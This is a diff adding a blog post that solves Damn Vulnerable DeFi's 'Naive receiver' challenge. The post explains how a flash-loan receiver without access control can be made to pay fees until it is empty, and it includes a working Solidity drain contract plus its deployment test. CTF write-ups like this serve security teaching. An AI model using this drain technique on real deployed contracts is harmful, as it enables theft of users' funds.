@@ -4,3 +4,133 @@ title: 'Damn Vulnerable DeFi Challenge #2 Solution'
 series: 'Damn Vulnerable DeFi'
 draftDate: 'Feb 09, 2023'
 ---
+
+import Quote from '../../../components/Quote.mdx'
+
+# {frontmatter.title}
+
+<Quote />
+
+_Published {frontmatter.publishDate}_
+
+> ## Challenge #2 - Naive receiver
+>
+> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
+>
+> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
+>
+> Take all ETH out of the user’s contract. If possible, in a single transaction.
+
+The first thing that stands out in these contracts is that neither the pool nor the receiver implement any sort of access control. The pool's `flashLoan` function calls the `onFlashLoan` function on any contract that is set as the `receiver`.
+
+```solidity
+// contracts/naive-receiver/NaiveReceiverLenderPool.sol
+
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != ETH) revert UnsupportedCurrency();
+
+    uint256 balanceBefore = address(this).balance;
+
+    // Transfer ETH and handle control to receiver
+    SafeTransferLib.safeTransferETH(address(receiver), amount);
+    if (
+        receiver.onFlashLoan(
+            msg.sender,
+            ETH,
+            amount,
+            FIXED_FEE,
+            data
+        ) != CALLBACK_SUCCESS
+    ) {
+        revert CallbackFailed();
+    }
+
+    if (address(this).balance < balanceBefore + FIXED_FEE)
+        revert RepayFailed();
+
+    return true;
+}
+```
+
+We can call the receiver's `onFlashLoan` function, and it will transfer back `amount` and `fee`. `amount` is set in the pool's `flashLoan` function's `amount` parameter. `fee` is set by the pool's `FIXED_FEE` constant (`1 ether`).
+
+```solidity
+// contracts/naive-receiver/FlashLoanReceiver.sol
+
+function onFlashLoan(
+    address,
+    address token,
+    uint256 amount,
+    uint256 fee,
+    bytes calldata
+) external returns (bytes32) {
+    assembly {
+        // gas savings
+        if iszero(eq(sload(pool.slot), caller())) {
+            mstore(0x00, 0x48f5c3ed)
+            revert(0x1c, 0x04)
+        }
+    }
+
+    if (token != ETH) revert UnsupportedCurrency();
+
+    uint256 amountToBeRepaid;
+    unchecked {
+        amountToBeRepaid = amount + fee;
+    }
+
+    _executeActionDuringFlashLoan();
+
+    // Return funds to pool
+    SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);
+
+    return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
+```
+
+We can call `onFlashLoan` on the receiver through the pool's `flashLoan` function. The receiver will transfer the fee to the pool, so all we have to do is repeatedly call `onFlashLoan` until the receiver is drained. The challenge asks us to do it in one transaction, though.
+
+To do so, we can create a loop in a contract's `constructor`, and it will run right when it is deployed. The contract's deployment will be our only transaction.
+
+Let's create a contract that transfers everything to the pool from within its `constructor`.
+
+```solidity
+// contracts/naive-receiver/Hose.sol
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "./NaiveReceiverLenderPool.sol";
+
+contract Hose {
+    constructor(
+        IERC3156FlashBorrower receiver,
+        NaiveReceiverLenderPool pool
+    ) {
+        while (address(receiver).balance >= 1 ether)
+            pool.flashLoan(receiver, pool.ETH(), 0, "");
+    }
+}
+```
+
+We call `flashLoan` on the pool until the receiver can no longer pay the fee. We set `flashLoan`'s `receiver` parameter as the receiver we want to call `onFlashLoan` on. The `token` parameter must be `0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE` or the function will revert. We can conveniently pass in the pool's `ETH` constant since it is `public`. The `amount` parameter doesn't matter in this case since the receiver does not do anything with the actual loan. It could really be anything between 0 and 1000 ETH (the pool's balance). The `data` parameter is also impactless, since the receiver just throws this argument out.
+
+A `for` loop might be better here, so we can set the amount of times we loop, and control how much gas we spend. But since the `player` account is balling out with 10,000 ETH, it doesn't matter much in this case.
+
+All that is left to do is compile and deploy our new contract.
+
+```js
+// test/naive-receiver/naive-receiver.challenge.js
+
+it('Execution', async function () {
+  await (
+    await ethers.getContractFactory('Hose', player)
+  ).deploy(receiver.address, pool.address)
+})
+```
